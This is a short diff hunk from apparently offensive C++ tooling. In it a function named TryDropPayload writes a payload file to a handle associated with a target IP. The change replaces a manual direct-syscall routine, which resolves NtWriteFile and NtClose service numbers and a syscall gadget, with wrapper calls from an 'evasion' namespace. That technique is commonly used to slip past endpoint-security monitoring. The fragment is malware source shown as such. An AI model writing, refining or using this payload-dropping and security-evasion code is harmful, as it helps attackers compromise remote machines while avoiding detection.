@@ -28,15 +28,10 @@ bool TryDropPayload(const std::string& targetIp) {
     DWORD read;
     ReadFile(hLocal, data.data(), (DWORD)data.size(), &read, NULL);
     CloseHandle(hLocal);
-    auto& resolver = evasion::SyscallResolver::GetInstance();
-    DWORD ntWriteFileSsn = resolver.GetServiceNumber("NtWriteFile");
-    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
-    PVOID gadget = resolver.GetSyscallGadget();
-    if (ntWriteFileSsn == 0xFFFFFFFF || !gadget) { CloseHandle(hFile); return false; }
 
     IO_STATUS_BLOCK ioStatus;
-    NTSTATUS status = InternalDoSyscall(ntWriteFileSsn, gadget, (UINT_PTR)hFile, 0, 0, 0, (UINT_PTR)&ioStatus, (UINT_PTR)data.data(), (UINT_PTR)data.size(), 0, 0, 0, 0);
-    InternalDoSyscall(ntCloseSsn, gadget, (UINT_PTR)hFile, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+    NTSTATUS status = evasion::SysNtWriteFile(hFile, NULL, NULL, NULL, &ioStatus, data.data(), (ULONG)data.size(), NULL, NULL);
+    evasion::SysNtClose(hFile);
     return NT_SUCCESS(status);
 }
 
